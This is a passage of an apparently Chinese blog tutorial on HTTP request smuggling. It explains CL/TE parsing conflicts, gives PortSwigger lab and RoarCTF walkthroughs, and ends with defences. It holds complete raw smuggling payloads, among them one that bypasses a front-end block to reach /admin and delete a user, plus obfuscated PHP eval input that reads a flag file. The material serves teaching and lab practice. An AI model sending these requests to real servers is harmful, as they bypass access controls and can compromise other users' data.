class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">87</span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问管理员页面验证是否删除<br><img src="https://img-blog.csdnimg.cn/20210408203807849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="CTF中的请求走私"><a href="#CTF中的请求走私" class="headerlink" title="CTF中的请求走私"></a>CTF中的请求走私</h2><p><strong>[RoarCTF 2019]Easy Calc</strong><br><img src="https://img-blog.csdnimg.cn/20210329210036824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>calc.php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在phpifo页面中发现禁用了一些函数和字符，所以尝试绕过，可以利用请求走私。</p><p>利用CL-CL漏洞，需要返回400错误<br><img src="https://img-blog.csdnimg.cn/20210411194834365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看phpinfo()信息<br><img src="https://img-blog.csdnimg.cn/20210411195001405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><code>getcwd()</code>:获取当前工作目录<br><img src="https://img-blog.csdnimg.cn/20210411195123773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>var_dump(scandir(dirname(__FILE__)))</code>：获取当前目录下的文件<br><img src="https://img-blog.csdnimg.cn/20210411195331613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>print_r(scandir(chr(47)))</code>：扫描根目录<br><img src="https://img-blog.csdnimg.cn/2021041119540679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>：读取flag<br><img src="https://img-blog.csdnimg.cn/20210411195452696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>同样利用CL-TE漏洞同样可以读取flag<br><img src="https://img-blog.csdnimg.cn/20210411195537869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>在前端服务器通过同一网络连接将多个请求转发到后端服务器的情况下，会出现HTTP请求走私漏洞，并且后端连接所使用的协议会带来两个服务器不同意边界的风险。要求。防止HTTP请求走私漏洞的一些通用方法如下：</p><ul><li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li><li>使用HTTP / 2进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</li><li>前端服务器和后端服务器使用完全相同的Web服务器软件，以便它们就请求之间的界限达成一致。</li></ul><p>在某些情况下，可以通过使前端服务器规范歧义请求或使后端服务器拒绝歧义请求并关闭网络连接来避免漏洞。但是，这些方法比上面确定的通用缓解措施更容易出错。</p><p>参考文章：<br><a href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a><br><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a><br><a href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a></p>]]></content>
+    <content type="html"><![CDATA[<p>摘要：HTTP请求走私漏洞</p> <a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><ul><li>利用Content-Length字段来判定请求体的内容长度 </li><li>利用Transfer-Encoding字段来判定请求体的结束位置</li></ul><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><p>Content-Length即为实体长度。浏览器可以通过 Content-Length 的长度信息，判断出响应实体已结束。通常如果 Content-Length 比实际长度短，会造成内容被截断；如果比实体内容长，会造成 pending。</p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><p>历史上 Transfer-Encoding 可以有多种取值，但最新的 HTTP 规范里，只定义了一种传输编码：分块编码（chunked）。</p><p>分块编码相当简单，在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF（\r\n），也不包括分块数据结尾的 CRLF。最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</p><h3 id="CL与TE解析优先级顺序"><a href="#CL与TE解析优先级顺序" class="headerlink" title="CL与TE解析优先级顺序"></a>CL与TE解析优先级顺序</h3><p>CL表示Content-Length，TE表示Transfer-Encoding。</p><p>优先级顺序详见 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3 </a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">If a message is received with both a Transfer-Encoding and a</span><br><span class="line">Content-Length header field, the Transfer-Encoding overrides the</span><br><span class="line">Content-Length. Such a message might indicate an attempt to perform</span><br><span class="line">request smuggling (Section 9.5) or response splitting (Section 9.4)</span><br><span class="line">and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</span><br></pre></td></tr></table></figure><p>TE 优先于 CL ，但可以通过一些方式绕过</p><h2 id="请求走私分类"><a href="#请求走私分类" class="headerlink" title="请求走私分类"></a>请求走私分类</h2><p>请求走私攻击包括将Content-Length标头和Transfer-Encoding 标头都放入单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p><ul><li>CL不为0:前端代理服务器允许请求携带请求体，而后端服务器不允许请求携带请求体。</li><li>CL-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li><li>CL-TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer- Encoding标头。</li><li>TE-TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。</li><li>TE-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li></ul><h3 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h3><p>所有不携带请求体的HTTP请求都有可能受此影响,这里以GET请求为例。</p><p>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p>比如构造请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p><strong>注：\r\n表示 CRLF即换行</strong></p><p>前端服务器处理了Content-Length，而后端服务器没有处理 Content-Length ，基于pipeline机制认为这是两个独立的请求：</p><p>第一个请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br></pre></td></tr></table></figure><p>第二个请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br></pre></td></tr></table></figure><h3 id="CL-CL漏洞"><a href="#CL-CL漏洞" class="headerlink" title="CL-CL漏洞"></a>CL-CL漏洞</h3><p><strong>RFC7230规范</strong>：在RFC7230的<a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">第3.3.3节</a>中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。</p><p>构造请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br><span class="line">Content-Length: 5\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">\r\n</span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>得到响应，返回400 Bad Request<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185910-522340.png" alt="2"><br><strong>触发过程</strong></p><p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。</p><h3 id="CL-TE漏洞"><a href="#CL-TE漏洞" class="headerlink" title="CL-TE漏洞"></a>CL-TE漏洞</h3><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">CL.TE实验环境</a></p><blockquote><p>实验描述：<br>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码（Transfer-Encoding解析），前端服务器拒绝未使用GET或POST方法之外的请求。</p><p>实验要求：<br>将请求走私到后端服务器，以便后端服务器处理的下一个请求像是使用了GPOST方法。</p></blockquote><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185934-758668.png" alt="labs1"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190020-357686.png" alt="1"><br>将请求行中请求方式修改为POST,在请求行添加Transfer-<code>Encoding: chunked</code>，然后在实体中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G\r\n</span><br></pre></td></tr></table></figure><p>连续发送两次请求就可以获得响应。<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190033-562357.png" alt="2"><br>分析：连续请求，G会被带入下一个请求，变为 <code>GPOST / HTTP/1.1\r\n</code></p><p><strong>触发过程</strong></p><p>前端服务器处理Content-Length头并确定请求主体长度为6个字节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>此请求经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到<code>0\r\n\r\n</code>时，会被认为已经读取到结尾了，但是剩下的字母G就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，G会被带入下一个请求，发送的请求在后端服务器变为 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br></pre></td></tr></table></figure><p>服务器在解析时会产生报错</p><h3 id="TE-TE漏洞"><a href="#TE-TE漏洞" class="headerlink" title="TE-TE漏洞"></a>TE-TE漏洞</h3><p>在这里，前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p><p>详见 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3.3</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">If a Transfer-Encoding header field is present <span class="keyword">in</span> a response and</span><br><span class="line">the chunked transfer coding is not the final encoding, the</span><br><span class="line">message body length is determined by reading the connection until</span><br><span class="line">it is closed by the server.  If a Transfer-Encoding header field</span><br><span class="line">is present <span class="keyword">in</span> a request and the chunked transfer coding is not</span><br><span class="line">the final encoding, the message body length cannot be determined</span><br><span class="line">reliably; the server MUST respond with the 400 (Bad Request)</span><br><span class="line">status code and <span class="keyword">then</span> close the connection.</span><br></pre></td></tr></table></figure><p>这里列出七种混淆方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><p>之所以在处理这些请求头时会出现问题，是因为在实际的HTTP协议实现中，很少有代码精确的遵循了其中的规范，以此导致面对变形的请求头时会出现不同的处理方式。而我们所要做的就是找到其中存在问题的服务器，然后使用类似前两个情形的攻击报文走私数据。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">TE.TE验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185807-72744.png" alt="QQ截图20210406190848"><br>构造请求，注意同样需要去掉勾选Update Content-Length</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>连续发送两次请求<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190116-607083.png" alt="2"></p><p>分析：前端将body的内容视为正常请求，到了后端，因为<code>Transfer-encoding: cow</code>无法识别，将会转而使用<code>Content-length: 4</code>，从而产生报错</p><h3 id="TE-CL漏洞"><a href="#TE-CL漏洞" class="headerlink" title="TE-CL漏洞"></a>TE-CL漏洞</h3><p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">TE.CL验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190225-786616.png" alt="timu"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190234-493978.png" alt="1"><br>进入实验，首先需要去掉勾选Update Content-Length防止Buprsuite自动更新Content-Length字段<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190250-681892.png" alt="0"><br>构造请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br><span class="line">......</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Content-Length: 3\r\n</span><br><span class="line">\r\n</span><br><span class="line">1\r\n</span><br><span class="line">G\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>连续发送两次请求得到响应<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190306-543465.png" alt="2"><br>G和0被走私了，带入了带入下一个请求，响应报文请求方法是G0POST，我们需要完整构造GPOST报文请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: demo.com\r\n</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>连续请求两次<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190317-764210.png" alt="3"></p><p>官方提供的方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: your-lab-id.web-security-academy.net\r\n</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>得到响应<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190337-171562.png" alt="4"><br><strong>触发过程</strong><br>由于前端服务器处理Transfer-Encoding，当其读取到0\r\n\r\n时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，当它读取完12\r\n之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>成功报错。</p><p>前端服务器处理Transfer-Encoding标头，因此将消息正文视为使用分块编码。它处理第一个块，声明为12个字节长，直到下一行的开始<code>GPOST / HTTP/1.1</code>。它处理第二个数据块，该数据块的长度为零，因此被视为终止请求。该请求被转发到后端服务器。</p><p>后端服务器处理Content-Length标头，并确定请求主体的长度为4个字节，直到下一行的开始12。以下以开头的字节<code>GPOST / HTTP/1.1</code>未处理，后端服务器会将其视为序列中下一个请求的开始。</p><h2 id="绕过前端服务器安全控制"><a href="#绕过前端服务器安全控制" class="headerlink" title="绕过前端服务器安全控制"></a>绕过前端服务器安全控制</h2><blockquote><p>实验描述：</p><p>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码。处有一个管理面板/admin，但是前端服务器禁止访问它。</p><p>要解决此问题，请将请求走私到访问管理面板并删除用户的后端服务器carlos。</p></blockquote><h3 id="利用CL-TE漏洞绕过"><a href="#利用CL-TE漏洞绕过" class="headerlink" title="利用CL-TE漏洞绕过"></a>利用CL-TE漏洞绕过</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a></p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190419-108405.png" alt="timu"></p><blockquote><p>实验描述：</p><p>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码。处有一个管理面板/admin，但是前端服务器禁止访问它。</p><p>要解决此问题，请将请求走私到访问管理面板并删除用户的后端服务器carlos。</p></blockquote><p>按照要求访问管理面板/admin，会提示Path /admin is blocked</p><p>利用CL-TE漏洞，构造数据包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Length: 37</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure><p>发现只能本地用户查看<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190431-281494.png" alt="1"><br>连续两次发出以下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure><p>观察到由于第二个请求的Host标头与第一个请求中的走私Host标头冲突，该请求被阻止。<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190443-9518.png" alt="2"><br>两次发出以下请求，以便将第二个请求的标头附加到走私的请求正文中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Length: 116</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure><p>现在可以访问管理面板</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190458-985555.png" alt="3"><br>根据响应内容，更改走私的请求URL以删除用户carlos：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Length: 139</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure><p>没有回显内容，使用上个数据包访问管理面板，验证是否删除成功<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190522-947042.png" alt="5"></p><h3 id="利用TE-CL漏洞绕过"><a href="#利用TE-CL漏洞绕过" class="headerlink" title="利用TE-CL漏洞绕过"></a>利用TE-CL漏洞绕过</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a><br><img 